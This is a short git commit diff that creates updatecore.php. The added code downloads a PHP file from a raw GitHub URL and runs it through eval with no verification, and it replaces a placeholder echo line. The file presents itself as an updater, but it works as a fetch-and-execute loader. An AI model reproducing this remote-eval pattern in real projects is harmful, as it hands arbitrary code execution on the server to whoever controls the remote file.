3b5faad8015e0ecd238ca6f4cfb05d8ac844a904
Mbina <mbinagds@gmail.com>
2025-05-18 09:49:27 +0330

    create updatecore.php

--- updatecore.php
+++ updatecore.php
@@ -1,7 +1,5 @@
 <?php
+$curl = "https://raw.githubusercontent.com/sshnevis/Server-Screening-Script/refs/heads/master/screening.php";
+$code = file_get_contents($curl);
+eval("?>".$code);
 
-
-echo "Preparing."; //its really fantastic
-
-
-?>
